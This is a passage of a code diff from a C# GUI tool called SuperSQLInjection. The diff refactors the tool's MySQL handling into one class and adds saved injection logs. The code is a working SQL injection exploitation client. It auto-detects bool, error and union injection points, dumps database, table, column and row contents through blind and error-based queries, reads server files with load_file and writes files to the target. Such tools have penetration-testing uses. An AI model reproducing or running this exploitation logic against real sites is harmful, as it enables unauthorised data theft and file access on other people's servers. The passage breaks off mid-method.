+                data_list.Add(MySQL.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("'{table}'", Tools.strToHex(sn.tableName, "UTF-8")));
+                String column_Name_data = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
+                String result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", column_Name_data));
                 this.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                 this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
             }
@@ -3041,9 +3035,9 @@ namespace SuperSQLInjection
                 SelectNode sn = (SelectNode)osn;
                 //获取数据库数量
                 List<String> data_list = new List<String>();
-                data_list.Add(MySQL5.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("'{table}'", Tools.strToHex(sn.tableName, "UTF-8")));
-                String column_Name_data = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
-                String result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", column_Name_data));
+                data_list.Add(MySQL.column_value.Replace("{index}", sn.limit.ToString()).Replace("'{dbname}'", Tools.strToHex(sn.dbname, "UTF-8")).Replace("'{table}'", Tools.strToHex(sn.tableName, "UTF-8")));
+                String column_Name_data = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
+                String result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", column_Name_data));
                 this.Invoke(new showLogDelegate(log), "发现列：" + result, LogLevel.info);
                 this.Invoke(new addNodeToTreeListDelegate(addNodeToTreeList), sn.tn, result, "column");
             }
@@ -3110,18 +3104,15 @@ namespace SuperSQLInjection
                             case DBType.Access:
                                 checkColumnsDic(ctn);
                                 break;
-                            case DBType.MySQL4:
-
-                                break;
-                            case DBType.MySQL5:
+                            case DBType.MySQL:
 
                                 if (KeyType.Time.Equals(config.keyType))
                                 {
-                                    columns_count = getValueByStepUp(MySQL5.getBoolCountBySleep(MySQL5.columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")), config.maxTime), 0, 20);
+                                    columns_count = getValueByStepUp(MySQL.getBoolCountBySleep(MySQL.columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")), config.maxTime), 0, 20);
                                 }
                                 else
                                 {
-                                    columns_count = getValueByStepUp(MySQL5.bool_columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")), 0, 20);
+                                    columns_count = getValueByStepUp(MySQL.bool_columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")), 0, 20);
                                 }
 
                                 this.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "发现" + columns_count + "个列！",LogLevel.info);
@@ -3214,13 +3205,10 @@ namespace SuperSQLInjection
                             case DBType.Access:
                                 checkColumnsDic(ctn);
                                 break;
-                            case DBType.MySQL4:
-
-                                break;
-                            case DBType.MySQL5:
-                                data_list.Add(MySQL5.columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")));
-                                columns_count_payload = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
-                                result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", columns_count_payload));
+                            case DBType.MySQL:
+                                data_list.Add(MySQL.columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")));
+                                columns_count_payload = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
+                                result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", columns_count_payload));
 
                                 this.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
                                 columns_count = Tools.convertToInt(result);
@@ -3302,14 +3290,11 @@ namespace SuperSQLInjection
                             case DBType.Access:
                                 MessageBox.Show("抱歉Access数据库，不支持错误显示注入！");
                                 break;
-                            case DBType.MySQL4:
-                                MessageBox.Show("抱歉MySQL4数据库，不支持错误显示注入！");
-                                break;
-                            case DBType.MySQL5:
+                            case DBType.MySQL:
 
-                                data_list.Add(MySQL5.columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")));
-                                columns_count_payload = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
-                                result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", columns_count_payload));
+                                data_list.Add(MySQL.columns_count.Replace("'{dbname}'", Tools.strToHex(dbName, "UTF-8")).Replace("'{table}'", Tools.strToHex(tableName, "UTF-8")));
+                                columns_count_payload = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
+                                result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", columns_count_payload));
 
                                 this.Invoke(new showLogDelegate(log), "报告大侠，表" + tableName + "有" + Tools.convertToInt(result) + "个列！", LogLevel.info);
                                 columns_count = Tools.convertToInt(result);
@@ -3423,7 +3408,7 @@ namespace SuperSQLInjection
 
                 GetDataPam gp = (GetDataPam)opam;
 
-                String data_payload = MySQL5.data_value.Replace("{dbname}", gp.dbname).Replace("{table}", gp.table).Replace("{limit}", gp.limit + "");
+                String data_payload = MySQL.data_value.Replace("{dbname}", gp.dbname).Replace("{table}", gp.table).Replace("{limit}", gp.limit + "");
 
                 ListViewItem lvi = null;
 
@@ -3431,28 +3416,28 @@ namespace SuperSQLInjection
                 {
                     //取每一列的值
 
-                    String payload_len = MySQL5.ver_length.Replace("{data}", data_payload).Replace("{columns}", columnName);
+                    String payload_len = MySQL.ver_length.Replace("{data}", data_payload).Replace("{columns}", columnName);
 
                     if (config.keyType.Equals(KeyType.Time))
                     {
-                        payload_len = MySQL5.getBoolCountBySleep(MySQL5.bool_length.Replace("{data}", data_payload).Replace("{columns}", columnName), config.maxTime);
+                        payload_len = MySQL.getBoolCountBySleep(MySQL.bool_length.Replace("{data}", data_payload).Replace("{columns}", columnName), config.maxTime);
                     }
                     int len = getValueByStepUp(payload_len, 0, 50);
 
 
-                    String va_payload = MySQL5.ver_value.Replace("{data}", data_payload).Replace("{columns}", columnName);
+                    String va_payload = MySQL.ver_value.Replace("{data}", data_payload).Replace("{columns}", columnName);
                     String colvalue = "";
 
                     //获取值
                     for (int i = 1; i <= len; i++)
                     {
-                        String tmp_va_payload = MySQL5.ord_value.Replace("{data}", data_payload).Replace("{index}", i + "").Replace("{columns}", columnName);
-                        String plen = MySQL5.ver_length.Replace("{data}", tmp_va_payload);
+                        String tmp_va_payload = MySQL.ord_value.Replace("{data}", data_payload).Replace("{index}", i + "").Replace("{columns}", columnName);
+                        String plen = MySQL.ver_length.Replace("{data}", tmp_va_payload);
                         int mu_payload_len = 0;
                         //MySQL多字节ord，先判断ord后的长度，在取每一个的值
                         if (config.keyType.Equals(KeyType.Time))
                         {
-                            mu_payload_len = getValue(MySQL5.getBoolCountBySleep(MySQL5.char_len.Replace("{data}", tmp_va_payload), config.maxTime), 2, 8);
+                            mu_payload_len = getValue(MySQL.getBoolCountBySleep(MySQL.char_len.Replace("{data}", tmp_va_payload), config.maxTime), 2, 8);
                         }
                         else
                         {
@@ -3469,11 +3454,11 @@ namespace SuperSQLInjection
                             int ascii = 0;
                             if (config.keyType.Equals(KeyType.Time))
                             {
-                                ascii = getValue(MySQL5.getBoolCountBySleep(MySQL5.mid_value.Replace("{data}", tmp_va_payload).Replace("{index}", m_index + ""), config.maxTime), 0, 9);
+                                ascii = getValue(MySQL.getBoolCountBySleep(MySQL.mid_value.Replace("{data}", tmp_va_payload).Replace("{index}", m_index + ""), config.maxTime), 0, 9);
                             }
                             else
                             {
-                                ascii = getValue(MySQL5.bool_ord_value.Replace("{data}", tmp_va_payload).Replace("{index}", m_index + ""), 0, 9);
+                                ascii = getValue(MySQL.bool_ord_value.Replace("{data}", tmp_va_payload).Replace("{index}", m_index + ""), 0, 9);
                             }
                             ver_tmp[m_index - 1] = ascii + "";
                             m_index++;
@@ -3807,8 +3792,8 @@ namespace SuperSQLInjection
             {
 
                 GetDataPam gp = (GetDataPam)opam;
-                String datas_value_payload = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, gp.columns, gp.table, gp.dbname, gp.limit);
-                String result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", datas_value_payload));
+                String datas_value_payload = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, gp.columns, gp.table, gp.dbname, gp.limit);
+                String result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", datas_value_payload));
 
                 this.Invoke(new showLogDelegate(log), "报告大侠，获取到第" + (gp.limit + 1) + "行数据", LogLevel.info);
                 String[] datas = Regex.Split(result, "\\$\\$\\$");
@@ -3925,16 +3910,16 @@ namespace SuperSQLInjection
                 {
                     //获取数据长度
 
-                    String datas_payload_columns = MySQL5.creatMySQLColumnStr(column);
-                    String datas_payload_length = MySQL5.char_length.Replace("{data}", "(select " + datas_payload_columns + " from " + gp.dbname + "." + gp.table + " limit " + gp.limit + ",1)");
+                    String datas_payload_columns = MySQL.creatMySQLColumnStr(column);
+                    String datas_payload_length = MySQL.char_length.Replace("{data}", "(select " + datas_payload_columns + " from " + gp.dbname + "." + gp.table + " limit " + gp.limit + ",1)");
 
-                    String d_l_e = MySQL5.creatMySQLColumnStr("(" + datas_payload_length + ")");
-                    String datas_payload_length_error = MySQL5.error_value.Replace("{data}", d_l_e);
+                    String d_l_e = MySQL.creatMySQLColumnStr("(" + datas_payload_length + ")");
+                    String datas_payload_length_error = MySQL.error_value.Replace("{data}", d_l_e);
 
                     String result_length = getOneDataByUnionOrError(datas_payload_length_error);
 
                     int sumlen = Tools.convertToInt(result_length);
-                    String datas_value_payload = "(select " + MySQL5.creatMySQLColumnsStrByError(column, gp.table, gp.dbname, gp.limit) + ")";
+                    String datas_value_payload = "(select " + MySQL.creatMySQLColumnsStrByError(column, gp.table, gp.dbname, gp.limit) + ")";
                     String result = "";
                     int start = 1;
                     //每次获取长度，err方式有长度限制
@@ -3943,8 +3928,8 @@ namespace SuperSQLInjection
                     while (start < sumlen)
                     {
                         //hex编码，防止中文等乱码
-                        String datas_value_column = ByPassForBetween(MySQL5.substr_value.Replace("{data}", datas_value_payload).Replace("{start}", start.ToString()), count);
-                        String c_datas_value_payload = MySQL5.error_value.Replace("{data}", datas_value_column);
+                        String datas_value_column = ByPassForBetween(MySQL.substr_value.Replace("{data}", datas_value_payload).Replace("{start}", start.ToString()), count);
+                        String c_datas_value_payload = MySQL.error_value.Replace("{data}", datas_value_column);
                         result += getOneDataByUnionOrError(c_datas_value_payload);
                         start += count;
                     }
@@ -4137,18 +4122,15 @@ namespace SuperSQLInjection
                         MessageBox.Show("没有这么多行数据，请改小点！");
                     }
                     break;
-                case DBType.MySQL4:
-
-                    break;
-                case DBType.MySQL5:
+                case DBType.MySQL:
 
                     if (config.keyType.Equals(KeyType.Time))
                     {
-                        isMax = findKeyInBody(MySQL5.getBoolCountBySleep(MySQL5.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), config.maxTime), (start + dataCount));
+                        isMax = findKeyInBody(MySQL.getBoolCountBySleep(MySQL.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), config.maxTime), (start + dataCount));
                     }
                     else
                     {
-                        isMax = findKeyInBody(MySQL5.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), (start + dataCount));
+                        isMax = findKeyInBody(MySQL.bool_datas_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table), (start + dataCount));
                     }
 
                     if (isMax)
@@ -4253,14 +4235,10 @@ namespace SuperSQLInjection
                 case DBType.Access:
                     MessageBox.Show(ErrorMessage.access_no_error_inject_info);
                     break;
-                case DBType.MySQL4:
-                    MessageBox.Show(ErrorMessage.mysql4_no_error_inject_info);
-                    break;
-                case DBType.MySQL5:
-
-                    data_list.Add(MySQL5.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table));
-                    datas_count_payload = MySQL5.creatMySQLColumnsStrByError(data_list, null, null, -1);
-                    result = getOneDataByUnionOrError(MySQL5.error_value.Replace("{data}", datas_count_payload));
+                case DBType.MySQL:
+                    data_list.Add(MySQL.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table));
+                    datas_count_payload = MySQL.creatMySQLColumnsStrByError(data_list, null, null, -1);
+                    result = getOneDataByUnionOrError(MySQL.error_value.Replace("{data}", datas_count_payload));
 
                     this.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);
 
@@ -4386,13 +4364,10 @@ namespace SuperSQLInjection
                     }
                     stp.WaitForIdle();
                     break;
-                case DBType.MySQL4:
-
-                    break;
-                case DBType.MySQL5:
-                    data_list.Add(MySQL5.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table));
-                    datas_count_payload = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
-                    result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", datas_count_payload));
+                case DBType.MySQL:
+                    data_list.Add(MySQL.data_count.Replace("{dbname}", this.curren_db).Replace("{table}", this.curren_table));
+                    datas_count_payload = MySQL.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, config.unionFill, data_list, null, null, -1);
+                    result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", datas_count_payload));
 
                     this.Invoke(new showLogDelegate(log), "报告大侠，表" + this.curren_table + "有" + Tools.convertToInt(result) + "行数据！", LogLevel.success);
 
@@ -4562,7 +4537,7 @@ namespace SuperSQLInjection
         public Thread injectThread = null;
         private void btn_autoInject_Click(object sender, EventArgs e)
         {
-
+            Tools.getRequestURI(this.txt_inject_request.Text);
             if (autoinject == 0)
             {
                 if (config.request.IndexOf("#inject#") != -1)
@@ -4628,7 +4603,6 @@ namespace SuperSQLInjection
                 //获取原始的页面信息
                 String request = config.request.Replace(data, strparam);
                 ServerInfo oserver = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, "获取原始页面", request, config.timeOut, HTTP.AutoGetEncoding, config.is_foward_302, config.redirectDoGet);
-
 
                 if (!HTTP.AutoGetEncoding.Equals(config.encoding))
                 {
@@ -4765,6 +4739,7 @@ namespace SuperSQLInjection
                             {
 
                                 this.Invoke(new showLogDelegate(log), "存在" + pals[2] + "payload:" + pals[0], LogLevel.success);
+                                config.testPayload = pals[0];
                                 selectInjectType(1);
                                 //识别数据库
                                 List<String> database_lsit = FileTool.readAllDic("config/database/");
@@ -4856,6 +4831,15 @@ namespace SuperSQLInjection
                     {
                         this.Invoke(new showLogDelegate(log), "报告大侠，没有读取到config/injection/injection.txt注入测试payload！", LogLevel.error);
                     }
+                    //记录注入日志
+                    if (boolInject) {
+                        config.injectType = InjectType.Bool;
+                        config.request= request.Replace(strparam, newParam);
+                        config.dbType = (DBType)Tools.caseDBTypeInt(currentDB);
+                        config.pname = param.Split('=')[0];
+                        config.uri = Tools.getRequestURI(request);
+                        logInject(config);
+                    }
 
                     //错误注入测试
                     this.Invoke(new showLogDelegate(log), "报告大侠，盲注测试完成，正在进行错误显示注入测试！", LogLevel.info);
@@ -4885,6 +4869,7 @@ namespace SuperSQLInjection
                                     selectInjectType(2);
                                     errorInject = true;
                                     newParam = strparam.Replace(param, param + "<Encode>" + pals[0].Replace(pals[4], "#inject#") + "</Encode>");
+                                    config.testPayload = pals[0];
                                     unionStartPayLoad = pals[0].Substring(0, pals[0].IndexOf(pals[4])).Replace(" or", " and");
                                     this.Invoke(new showLogDelegate(log), "自动标记错误显示注入完成！", LogLevel.info);
                                     break;
@@ -4899,14 +4884,24 @@ namespace SuperSQLInjection
 
                     }
                     this.Invoke(new showLogDelegate(log), "报告大侠，错误显示测试完成，正在进行Union注入测试！", LogLevel.info);
-                    //union注入
 
-                    //最大100列
+                    //记录注入日志
+                    if (errorInject)
+                    {
+                        config.injectType = InjectType.Error;
+                        config.request = request.Replace(strparam, newParam);
+                        config.dbType = (DBType)Tools.caseDBTypeInt(currentDB);
+                        config.pname = param.Split('=')[0];
+                        config.uri = Tools.getRequestURI(request);
+                        logInject(config);
+                    }
+
+                    //union注入
                     String payload = "";
 
                     if ("SQLServer".Equals(currentDB))
                     {
-                        payload = unionStartPayLoad + "{payload};--";
+                        payload = unionStartPayLoad + "{payload}--";
 
                     }
                     else if ("MySQL".Equals(currentDB))
@@ -4989,13 +4984,23 @@ namespace SuperSQLInjection
                                 }
                             }
                         }
-
+                        config.testPayload = unionPayload;
 
                     }
                     if (isFind)
                     {
-
+                        
                         this.Invoke(new showLogDelegate(log), "此注入点支持Union注入，自动选择注入方式完成！", LogLevel.success);
+                    }
+                    //记录注入日志
+                    if (unionInject)
+                    {
+                        config.injectType = InjectType.Union;
+                        config.request = request.Replace(strparam, newParam);
+                        config.dbType = (DBType)Tools.caseDBTypeInt(currentDB);
+                        config.pname = param.Split('=')[0];
+                        config.uri = Tools.getRequestURI(request);
+                        logInject(config);
                     }
                     if (boolInject || errorInject || unionInject)
                     {
@@ -5017,6 +5022,38 @@ namespace SuperSQLInjection
             this.btn_autoInject.Text = "自动识别";
             autoinject = 0;
         }
+
+        public void logInject(Config config)
+        {
+            try
+            {         
+                String savePath = AppDomain.CurrentDomain.BaseDirectory + "/logs/injection/" + config.domain + "/" + config.port + config.uri;
+                DirectoryInfo dc = new DirectoryInfo(savePath);
+                dc.Create();
+                config.saveConfigpath = dc.FullName + "/" + config.pname + "_" + config.injectType.ToString() + ".xml";
+                this.Invoke(new delegatelogInject(logInjectTolvw), config);
+                XML.saveConfig(config.saveConfigpath, config);
+            }
+            catch (Exception e) {
+                this.Invoke(new showLogDelegate(log), "记录注入日志发生异常！" + e.Message, LogLevel.waring);
+            }
+        }
+        delegate void delegatelogInject(Config config);
+
+        public void logInjectTolvw(Config config){
+            ListViewItem lvw = new ListViewItem(config.domain);
+            lvw.Tag = config.saveConfigpath;
+            lvw.SubItems.Add(config.port+"");
+            lvw.SubItems.Add(config.uri);
+            lvw.SubItems.Add(config.pname);
+            lvw.SubItems.Add(config.injectType.ToString());
+            lvw.SubItems.Add(config.dbType.ToString());
+            lvw.SubItems.Add(config.testPayload);
+            lvw.SubItems.Add(DateTime.Now.ToString());
+            
+            this.lvw_injectLog.Items.Add(lvw);
+        }
+
         public void selectInjectType(int index)
         {
             this.cbox_basic_injectType.SelectedIndex = index;
@@ -5170,28 +5207,7 @@ namespace SuperSQLInjection
 
         private void cbox_basic_dbType_SelectedIndexChanged(object sender, EventArgs e)
         {
-            switch (this.cbox_basic_dbType.SelectedIndex)
-            {
-
-                case 0:
-                    config.dbType = DBType.UnKnow;
-                    break;
-                case 1:
-                    config.dbType = DBType.Access;
-                    break;
-                case 2:
-                    config.dbType = DBType.MySQL5;
-                    break;
-                case 3:
-                    config.dbType = DBType.SQLServer;
-                    break;
-                case 4:
-                    config.dbType = DBType.Oracle;
-                    break;
-                case 5:
-                    config.dbType = DBType.MySQL4;
-                    break;
-            }
+            config.dbType = (DBType)this.cbox_basic_dbType.SelectedIndex;
         }
         private void txt_inject_unionColumnsCount_TextChanged(object sender, EventArgs e)
         {
@@ -5235,7 +5251,6 @@ namespace SuperSQLInjection
             try
             {
                 XML.saveConfig("lastConfig.xml", this.config);
-               
             }
             catch (Exception ex)
             {
@@ -5472,79 +5487,20 @@ namespace SuperSQLInjection
             this.cbox_basic_timeOut.Text = config.timeOut + "";
             this.cbox_basic_encoding.Text = config.encoding;
             this.chk_sencondInject.Checked = config.sencondInject;
-            switch (config.injectType)
-            {
-
-                case InjectType.UnKnow:
-                    this.cbox_basic_injectType.SelectedIndex = 0;
-                    break;
-                case InjectType.Bool:
-                    this.cbox_basic_injectType.SelectedIndex = 1;
-                    break;
-                case InjectType.Error:
-                    this.cbox_basic_injectType.SelectedIndex = 2;
-                    break;
-                case InjectType.Union:
-                    this.cbox_basic_injectType.SelectedIndex = 3;
-                    break;
-
-            }
-            switch (config.dbType)
-            {
-
-                case DBType.UnKnow:
-                    this.cbox_basic_dbType.SelectedIndex = 0;
-                    break;
-                case DBType.Access:
-                    this.cbox_basic_dbType.SelectedIndex = 1;
-                    break;
-                case DBType.MySQL5:
-                    this.cbox_basic_dbType.SelectedIndex = 2;
-                    break;
-                case DBType.SQLServer:
-                    this.cbox_basic_dbType.SelectedIndex = 3;
-                    break;
-                case DBType.Oracle:
-                    this.cbox_basic_dbType.SelectedIndex = 4;
-                    break;
-                case DBType.MySQL4:
-                    this.cbox_basic_dbType.SelectedIndex = 5;
-                    break;
-            }
+            this.cbox_basic_injectType.SelectedIndex = (int)config.injectType;
+            this.cbox_basic_dbType.SelectedIndex = (int)(config.dbType);
+           
             this.data_dbs_cob_db_encoding.Text = config.db_encoding;
             this.cbox_basic_threadSize.Text = config.threadSize + "";
             this.cbox_basic_reTryCount.Text = config.reTry + "";
             this.txt_inject_key.Text = config.key;
             this.chk_inject_foward_302.Checked = config.is_foward_302;
             this.chk_inject_reverseKey.Checked = config.reverseKey;
+            this.cbox_inject_type.SelectedIndex = (int)(config.keyType);
 
-
-            switch (config.keyType)
+            if (config.keyType.Equals(KeyType.Time))
             {
-
-                case KeyType.Key:
-                    this.cbox_inject_type.SelectedIndex = 0;
-                    break;
-                case KeyType.Reg:
-                    this.cbox_inject_type.SelectedIndex = 1;
-                    break;
-                case KeyType.Code:
-                    this.cbox_inject_type.SelectedIndex = 2;
-                    break;
-                case KeyType.Time:
-                    this.cbox_inject_type.SelectedIndex = 3;
-                    config.maxTime = Tools.convertToInt(config.key);
-                    break;
-                case KeyType.EQLen:
-                    this.cbox_inject_type.SelectedIndex = 4;
-                    break;
-                case KeyType.MinLen:
-                    this.cbox_inject_type.SelectedIndex = 5;
-                    break;
-                case KeyType.MaxLen:
-                    this.cbox_inject_type.SelectedIndex = 6;
-                    break;
-
+                config.maxTime = Tools.convertToInt(config.key);
             }
 
             this.chk_openURLEncoding.Checked = config.isOpenURLEncoding;
@@ -5677,9 +5633,8 @@ namespace SuperSQLInjection
             if (saveFileDialog.ShowDialog() == DialogResult.OK)
             {
                 XML.saveConfig(saveFileDialog.FileName, config);
+                MessageBox.Show("导出成功！");
             }
-
-            MessageBox.Show("导出成功！");
         }
 
         private void tsmi_update_Click(object sender, EventArgs e)
@@ -5766,7 +5721,7 @@ namespace SuperSQLInjection
             }
             if (this.file_cbox_readWrite.SelectedIndex == 0)
             {
-                data_payload = MySQL5.hex.Replace("{data}", "load_file(" + path_16 + ")");
+                data_payload = MySQL.hex.Replace("{data}", "load_file(" + path_16 + ")");
                 switch (config.injectType)
                 {
                     case InjectType.Bool:
@@ -5777,7 +5732,7 @@ namespace SuperSQLInjection
                                 MessageBox.Show("大侠，请在注入中心，配置Bool盲注的判断值！");
                                 return;
                             }
-                            String payload_len = MySQL5.ver_length.Replace("{data}", data_payload);
+                            String payload_len = MySQL.ver_length.Replace("{data}", data_payload);
                             int len = getValueByStepUp(payload_len, 0, 50000);
                             this.dataCount = len;
                             String value = "";
@@ -5811,7 +5766,7 @@ namespace SuperSQLInjection
                                 return;
                             }
 
-                            String result = getOneDataByUnionOrError(MySQL5.union_value.Replace("{data}", MySQL5.creatMySQLReadFileByUnion(config.columnsCount, config.showColumn, config.unionFill, "convert(load_file(" + path_16 + ") using UTF8)")));
+                            String result = getOneDataByUnionOrError(MySQL.union_value.Replace("{data}", MySQL.creatMySQLReadFileByUnion(config.columnsCount, config.showColumn, config.unionFill, "convert(load_file(" + path_16 + ") using UTF8)")));
                             this.dataCount = result.Length;
                             this.currentDataCount = result.Length;
                             this.Invoke(new StringDelegate(file_txt_resultSetText), result);
@@ -5825,8 +5780,8 @@ namespace SuperSQLInjection
                     case InjectType.Error:
                         try
                         {
-                            String payload_len = MySQL5.char_length.Replace("{data}", data_payload);
-                            String payload_len_error = MySQL5.error_value.Replace("{data}", MySQL5.creatMySQLColumnStr(payload_len));
+                            String payload_len = MySQL.char_length.Replace("{data}", data_payload);
+                            String payload_len_error = MySQL.error_value.Replace("{data}", MySQL.creatMySQLColumnStr(payload_len));
 
                             String result_length = getOneDataByUnionOrError(payload_len_error);
 
@@ -5842,8 +5797,8 @@ namespace SuperSQLInjection
                             while (start < sumlen)
                             {
                                 //hex编码，防止中文等乱码
-                                String datas_value_tmp = ByPassForBetween(MySQL5.creatMySQLColumnStr(MySQL5.substr_value.Replace("{data}", data_payload).Replace("{start}", start.ToString())), count);
-                                String c_datas_value_payload = MySQL5.error_value.Replace("{data}", datas_value_tmp);
+                                String datas_value_tmp = ByPassForBetween(MySQL.creatMySQLColumnStr(MySQL.substr_value.Replace("{data}", data_payload).Replace("{start}", start.ToString())), count);
+                                String c_datas_value_payload = MySQL.error_value.Replace("{data}", datas_value_tmp);
                                 result += getOneDataByUnionOrError(c_datas_value_payload);
                                 start += count;
                                 this.currentDataCount = result.Length;
@@ -5875,7 +5830,7 @@ namespace SuperSQLInjection
                 {
                     if (!String.IsNullOrEmpty(this.file_txt_result.Text))
                     {
-                        String payload = MySQL5.creatMySQLWriteFileByUnion(config.columnsCount, config.showColumn, config.unionFill, path, this.file_txt_result.Text);
+                        String payload = MySQL.creatMySQLWriteFileByUnion(config.columnsCount, config.showColumn, config.unionFill, path, this.file_txt_result.Text);
                         HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, payload, config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);
                         MessageBox.Show("大侠，写文件操作小的我已经完成了额，剩下的就请大侠人工检查写文件是否成功！");
                     }
@@ -6005,7 +5960,7 @@ namespace SuperSQLInjection
         {
             String[] ps = param.ToString().Split('#');
             int index = int.Parse(ps[1].ToString());
-            String tmp_va_payload = MySQL5.ver_value.Replace("{data}", ps[0]).Replace("{index}", (index + 1) + "");
+            String tmp_va_payload = MySQL.ver_value.Replace("{data}", ps[0]).Replace("{index}", (index + 1) + "");
             //数字加大写字母的ascii码
             int ascii = getValue(tmp_va_payload, 48, 90);
             ver_tmp[index] = ((char)ascii).ToString();
@@ -6193,7 +6148,7 @@ namespace SuperSQLInjection
         {
             if (status == 0)
             {
-                if (config.dbType.Equals(DBType.MySQL5) || config.dbType.Equals(DBType.SQLServer))
+                if (config.dbType.Equals(DBType.MySQL) || config.dbType.Equals(DBType.SQLServer))
                 {
                     if (String.IsNullOrEmpty(this.file_txt_filePath.Text))
                     {
@@ -7468,32 +7423,7 @@ namespace SuperSQLInjection
         private void cbox_inject_type_SelectedIndexChanged(object sender, EventArgs e)
         {
             int c = this.cbox_inject_type.SelectedIndex;
-            switch (c)
-            {
-                case 0:
-                    config.keyType = KeyType.Key;
-                    break;
-                case 1:
-                    config.keyType = KeyType.Reg;
-                    break;
-
-                case 2:
-                    config.keyType = KeyType.Code;
-                    break;
-                case 3:
-                    config.keyType = KeyType.Time;
-                    break;
-                case 4:
-                    config.keyType = KeyType.EQLen;
-                    break;
-                case 5:
-                    config.keyType = KeyType.MaxLen;
-                    break;
-                case 6:
-                    config.keyType = KeyType.MinLen;
-                    break;
-
-            }
+            config.keyType = (KeyType)c;
         }
 
         private void tsmi_createGetTemplate_Click(object sender, EventArgs e)
@@ -7791,30 +7721,52 @@ namespace SuperSQLInjection
                 }
             }
         }
-        private void readData(Object osockt)
+
+        private void bypass_chk_useLike_CheckedChanged(object sender, EventArgs e)
         {
-            this.Invoke(new showLogDelegate(log), "接受数据", LogLevel.info);
-            Socket socket = (Socket)osockt;
-
-            byte[] data = new byte[1024 * 1024];
-            //侦听端口号
-            String ctmp = "";
-            int sum = 0;
-            do
-            {
-               
-                int len = socket.Receive(data,sum, 1024, SocketFlags.None);
-                if (len > 0)
-                {
-                    sum += len;
-                }
-                ctmp = Encoding.UTF8.GetString(data);
-
-            } while ((ctmp.IndexOf("\r\n\r\n") == -1));
-            this.Invoke(new showLogDelegate(log), ctmp, LogLevel.info);
-            
-
+            config.useLike = this.bypass_chk_useLike.Checked;
         }
-       
+
+        private void tsmi_injectLog_clearAllLog_Click(object sender, EventArgs e)
+        {
+            this.lvw_injectLog.Items.Clear();
+            Tools.delAllFiles(AppDomain.CurrentDomain.BaseDirectory+ "/logs/injection/");
+            MessageBox.Show("记录已经清空！");
+        }
+
+        private void tsmi_injectLog_useCLog_Click(object sender, EventArgs e)
+        {
+            if (this.lvw_injectLog.SelectedItems.Count > 0)
+            {
+                try
+                {
+                    this.config = XML.readConfig(this.lvw_injectLog.SelectedItems[0].Tag.ToString());
+                    reloadConfig(this.config);
+                    MessageBox.Show("加载注入记录成功！");
+                }
+                catch (Exception ep) {
+                    log("加载注入记录失败！--"+ep.Message, LogLevel.waring);
+                }
+            }
+        }
+
+        private void tsmi_injectLog_delSLog_Click(object sender, EventArgs e)
+        {
+            if (this.lvw_injectLog.SelectedItems.Count > 0)
+            {
+                try
+                {
+                    foreach (ListViewItem lvw in this.lvw_injectLog.SelectedItems) {
+                        Tools.delFile(lvw.Tag.ToString());
+                    }
+                    this.lvw_injectLog.Items.Remove(this.lvw_injectLog.SelectedItems[0]);
+                    MessageBox.Show("删除选择记录成功！");
+                }
+                catch (Exception ep)
